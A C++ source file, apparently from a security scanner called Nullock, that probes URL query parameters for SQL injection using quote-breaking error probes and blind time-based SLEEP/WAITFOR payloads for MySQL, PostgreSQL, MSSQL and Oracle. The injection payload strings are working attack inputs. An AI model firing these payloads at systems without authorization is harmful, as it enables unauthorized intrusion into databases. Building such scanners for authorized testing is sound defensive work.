#include "sql_injection.hpp"
#include "networking.hpp"

#include <QElapsedTimer>
#include <QSet>
#include <QUrl>
#include <QUrlQuery>

namespace Nullock::Core::SqlInjection {

namespace {

constexpr int kMaxSends  = 90;
constexpr int kMaxParams = 12;

QString queryWith(const QString &existing, const QString &param, const QString &value) {
    const QByteArray enc = QUrl::toPercentEncoding(value);
    QStringList parts;
    const QUrlQuery q(existing);
    for (const auto &kv : q.queryItems(QUrl::FullyEncoded))
        if (QUrl::fromPercentEncoding(kv.first.toUtf8()) != param)
            parts << kv.first + "=" + kv.second;
    parts << param + "=" + QString::fromUtf8(enc);
    return parts.join('&');
}

// Blind time-based payloads, per DBMS. %1 is the sleep seconds, so the same
// shape gives a SLEEP(N) probe and a SLEEP(0) control -- if the delay tracks N
// (and the 0-control doesn't stall) the injected SQL ran. The single-fire
// subquery forms come first per DBMS; the bare "OR SLEEP" forms (numeric
// context) can multiply the sleep by row count and overshoot the timeout, so
// they are tried only after the subquery form.
struct TimePayload { const char *dbms; const char *tmpl; };
const QList<TimePayload> &timePayloads() {
    static const QList<TimePayload> p = {
        { "MySQL",      "'-(SELECT SLEEP(%1))-'" },
        { "MySQL",      "1 OR SLEEP(%1)-- -" },
        { "PostgreSQL", "';SELECT pg_sleep(%1)-- -" },
        { "PostgreSQL", "1 OR (SELECT 1 FROM pg_sleep(%1))-- -" },
        { "MSSQL",      "1;WAITFOR DELAY '0:0:%1'-- -" },
        { "MSSQL",      "';WAITFOR DELAY '0:0:%1'-- -" },
        { "Oracle",     "1 OR dbms_pipe.receive_message('a',%1)-- -" },
    };
    return p;
}
constexpr int kSleepSeconds    = 5;
constexpr int kTimeThresholdMs = 4000;   // delay over baseline that signals a sleep ran

} // namespace

QStringList defaultParams() {
    // Ordered by SQLi yield so the cap keeps the highest-signal names; overflow
    // (for caller-supplied query params) goes to droppedParams.
    return { "id", "category", "cat", "product", "item", "order", "sort",
             "filter", "page", "search", "q", "query", "user", "username", "name" };
}

Result test(const Request &reqIn) {
    Result result;
    if (reqIn.host.isEmpty()) { result.error = "host required"; return result; }
    Request req = reqIn;
    if (req.basePath.isEmpty()) req.basePath = QStringLiteral("/");

    QStringList params;
    if (!req.param.isEmpty()) {
        params << req.param;
    } else {
        const QUrlQuery q(req.query);
        for (const auto &kv : q.queryItems())
            if (!params.contains(kv.first)) params << kv.first;
        if (params.isEmpty()) params = defaultParams();
    }
    if (params.size() > kMaxParams) {
        result.droppedParams = params.mid(kMaxParams);   // surfaced so a clean
        params = params.mid(0, kMaxParams);              // result isn't silently partial
    }
    result.testedParams = params;

    HttpClient client;
    const quint16 port = static_cast<quint16>(req.port);
    auto send = [&](const QString &query) {
        ++result.requestsSent;
        return client.send(req.host, port, req.tls, buildRequest(req, query));
    };

    const auto base = send(req.query);
    if (!base.ok) { result.error = "baseline failed: " + base.errorMessage; return result; }
    result.baselineStatus = base.parsed.statusCode;
    // If the baseline already shows a DB error, we can't attribute one to us.
    const bool baselineErrored = !matchError(base.parsed.body).first.isEmpty();

    // Syntax-breakers (likely to error) and their balanced counterparts (which
    // re-balance the quote and should NOT error if the breaker did).
    struct Probe { const char *breaker; const char *balanced; };
    static const QList<Probe> probes = {
        { "'",    "''" },
        { "\"",   "\"\"" },
        { "')",   "'')" },
        { "';",   "'';" },   // balanced must even out the quote count, not just append --
    };

    QSet<QString> confirmedParams;
    for (const QString &param : params) {
        if (result.requestsSent >= kMaxSends) break;
        for (const Probe &p : probes) {
            if (result.requestsSent >= kMaxSends) break;
            const auto r = send(queryWith(req.query, param, QString::fromUtf8(p.breaker)));
            if (!r.ok) continue;
            const auto err = matchError(r.parsed.body);
            if (err.first.isEmpty()) continue;
            // A generic-family match on a block-ish status is a WAF/edge block,
            // not a backend SQL error -- reject (DBMS-specific fingerprints,
            // which a block page won't carry, are trusted on any status).
            if (err.first == "generic" && isBlockStatus(r.parsed.statusCode)) continue;
            // Corroborate: the balanced payload should re-close the quote and
            // clear the error. If it ALSO errors (or the baseline already did),
            // the error isn't driven by our quote -- skip.
            if (baselineErrored) continue;
            const auto rb = send(queryWith(req.query, param, QString::fromUtf8(p.balanced)));
            // Require the balanced payload to succeed AND clear the error. A
            // failed balanced request can't corroborate, so don't confirm on it.
            if (!rb.ok || !matchError(rb.parsed.body).first.isEmpty()) continue;
            result.hits.append({ param, err.first, QStringLiteral("error-based"),
                                 QString::fromUtf8(p.breaker), err.second });
            result.vulnerable = true;
            confirmedParams.insert(param);
            break;
        }
    }

    // ---- Blind time-based phase (opt-in; slow) ----
    // For params not already confirmed error-based, inject a SLEEP(N) and flag
    // when the response is delayed by ~N seconds AND a SLEEP(0) control of the
    // same shape is NOT delayed (rules out a generally slow/tarpitting server),
    // with the delay reproducing on a re-send. Reserve the full minimum for one
    // payload triple (2 timing baselines + 3 sends) so we don't spend the two
    // baseline sends with no payload round left to run.
    if (req.timeBased && result.requestsSent + 5 <= kMaxSends) {
        // A timed send that returns BOTH the elapsed ms and whether it actually
        // completed -- a transport timeout (ok=false, ~15s) must never be
        // counted as a SLEEP delay, so callers gate hits on ok.
        struct Timed { int ms; bool ok; };
        auto timed = [&](const QString &param, const QString &val) -> Timed {
            QElapsedTimer t; t.start();
            ++result.requestsSent;
            const auto r = client.send(req.host, port, req.tls,
                                       buildRequest(req, queryWith(req.query, param, val)));
            return { static_cast<int>(t.elapsed()), r.ok };
        };
        // Quick timing baseline (the error-phase baseline body was for text).
        const int tb1 = timed(QStringLiteral("x"), QStringLiteral("1")).ms;
        const int tb2 = timed(QStringLiteral("x"), QStringLiteral("1")).ms;
        const int timeBaseline = qMin(tb1, tb2);
        for (const QString &param : params) {
            if (confirmedParams.contains(param)) continue;
            if (result.requestsSent + 3 > kMaxSends) break;
            bool hit = false;
            for (const TimePayload &tp : timePayloads()) {
                if (hit || result.requestsSent + 3 > kMaxSends) break;
                const QString sleepVal = QString::fromUtf8(tp.tmpl).arg(kSleepSeconds);
                const Timed d1 = timed(param, sleepVal);
                // The probe must COMPLETE and be delayed -- a timeout (ok=false)
                // is a stalled connection, not a confirmed SLEEP.
                if (!d1.ok || d1.ms - timeBaseline < kTimeThresholdMs) continue;
                // SLEEP(0) control of the same shape must complete AND be fast;
                // a slow/failed control means the delay isn't sleep-specific.
                const Timed c = timed(param, QString::fromUtf8(tp.tmpl).arg(0));
                if (!c.ok || c.ms - timeBaseline >= kTimeThresholdMs) continue;
                // Reproduce the delay (must also complete and be slow).
                const Timed d2 = timed(param, sleepVal);
                if (!d2.ok || d2.ms - timeBaseline < kTimeThresholdMs) continue;
                result.hits.append({ param, QString::fromUtf8(tp.dbms),
                    QStringLiteral("time-based"), sleepVal,
                    QStringLiteral("SLEEP(%1) delayed ~%2ms; SLEEP(0) fast")
                        .arg(kSleepSeconds).arg(d1.ms - timeBaseline) });
                result.vulnerable = true;
                hit = true;
            }
        }
    }

    return result;
}

} // namespace Nullock::Core::SqlInjection
